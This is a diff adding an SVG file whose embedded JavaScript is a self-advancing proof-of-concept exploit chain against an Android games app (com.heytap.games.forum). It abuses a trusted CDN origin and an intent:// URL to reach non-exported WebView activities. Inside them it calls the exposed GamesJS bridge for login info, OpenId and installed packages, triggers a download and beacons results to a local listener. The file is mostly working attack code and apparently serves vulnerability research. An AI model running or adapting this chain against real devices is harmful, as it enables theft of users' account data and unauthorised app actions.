@@ -1,0 +1,84 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 660 1200">
+  <rect width="100%" height="100%" fill="#ffffff"/>
+  <g font-family="monospace" font-size="14" fill="#000000">
+    <text x="8" y="22">POC — trusted-origin page in a NON-EXPORTED container</text>
+    <text x="8" y="42">(served from whitelisted host cdn.jsdelivr.net)</text>
+    <text id="l1" x="8" y="70"/>
+    <text id="l2" x="8" y="90"/>
+    <text id="l3" x="8" y="110"/>
+    <text id="l4" x="8" y="130"/>
+    <text id="l5" x="8" y="150"/>
+    <text id="l6" x="8" y="170"/>
+    <text id="l7" x="8" y="190"/>
+    <text id="l8" x="8" y="210"/>
+    <text id="l9" x="8" y="230"/>
+    <text id="l10" x="8" y="250"/>
+    <text id="l11" x="8" y="270"/>
+    <text id="l12" x="8" y="290"/>
+    <text id="l13" x="8" y="310"/>
+    <text id="l14" x="8" y="330"/>
+    <text id="l15" x="8" y="350"/>
+    <text id="l16" x="8" y="370"/>
+  </g>
+  <script type="text/javascript"><![CDATA[
+  /* 单文件、自推进的攻击链 PoC（SVG 形态，因为 jsDelivr 对 .html 返回 text/plain 不执行脚本）
+     hop1: HybridWebViewActivity（exported=false，由外部 deeplink 驱动）
+     hop2: GameOnlyPlayActivity（exported=false，由 hop1 页面内的 intent:// 驱动，注册 GamesJS） */
+  var wait = 0, lines = [], MAX = 16;
+  function el(i){ return document.getElementById('l' + (i + 1)); }
+  function paint(){
+    for (var i = 0; i < MAX; i++) { var e = el(i); if (e) e.textContent = lines[i] || ''; }
+  }
+  function put(s){ if (lines.length < MAX) { lines.push(s); } else { lines.shift(); lines.push(s); } paint(); }
+  function beacon(k, v){
+    try { new Image().src = 'http://127.0.0.1:8899/beacon?k=' + encodeURIComponent('cdn.' + k)
+      + '&v=' + encodeURIComponent(String(v).slice(0, 500)) + '&r=' + Math.random(); } catch(e){}
+  }
+  function log(k, v){ put(k + ' = ' + String(v).slice(0, 90)); beacon(k, v); }
+  function promptCall(method, args){
+    try { return String(prompt(JSON.stringify({method: method, args: args || {}}))); } catch(e){ return 'ERR:' + e; }
+  }
+  function jsapi(method, params){
+    try { if (!window.appJsBridge) return 'NO_appJsBridge';
+      var r = (params === undefined) ? window.appJsBridge.callApi(method) : window.appJsBridge.callApi(method, params);
+      return (r === undefined) ? '<void>' : String(r);
+    } catch(e){ return 'ERR:' + e; }
+  }
+
+  var stage = (location.search.indexOf('stage=2') >= 0) ? 2 : 1;
+  log('href', location.href);
+  log('stage', stage);
+
+  if (stage === 1) {
+    /* ---- hop1: 可信源页面 → 拉起非导出 H5 游戏容器 ---- */
+    setTimeout(function(){
+      log('appJsBridge', typeof window.appJsBridge);
+      log('prompt.getEnv.isLogin', promptCall('getEnv', {key: 'isLogin'}));
+      log('prompt.getEnv.network', promptCall('getEnv', {key: 'network'}));
+      log('prompt.getEnv.apkversion', promptCall('getEnv', {key: 'apkversion'}));
+      var self = location.href.split('#')[0].split('?')[0];
+      var it = 'intent://launch#Intent;component=com.heytap.games.forum/'
+        + 'com.games.gameslobby.tangram.activity.GameOnlyPlayActivity;'
+        + 'S.url=' + self + '?stage=2;S.appid=1000001;end';
+      log('firing intent ->', 'GameOnlyPlayActivity (exported=false)');
+      try { location.href = it; } catch(e){ log('intent_ERR', e); }
+    }, 900);
+  } else {
+    /* ---- hop2: 非导出 H5 游戏容器内 → GamesJS 全表（不看 host 就注册） ---- */
+    setTimeout(function(){
+      log('appJsBridge', typeof window.appJsBridge);
+      log('getBrand', jsapi('getBrand'));
+      log('isLogin', jsapi('isLogin'));
+      log('getLoginInfo', jsapi('getLoginInfo'));
+      log('getOpenId', jsapi('getOpenId'));
+      log('getHost', jsapi('getHost'));
+      log('getNetworkType', jsapi('getNetworkType'));
+      log('isInstalled(settings)', jsapi('isInstalled', {packageName: 'com.android.settings'}));
+      log('checkNeedDownload(settings)', jsapi('checkIfNeedDownloadOrUpdate', {pkg: 'com.android.settings', version: 1}));
+      log('showToast', jsapi('showToast', {text: 'POC: attacker page called GamesJS', duration: 1}));
+      log('downloadOrUpdate(dummy)', jsapi('downloadOrUpdate', {pkg: 'com.poc.nonexistent.app'}));
+      log('phase_end', 'all calls returned');
+    }, 700);
+  }
+  ]]></script>
+</svg>
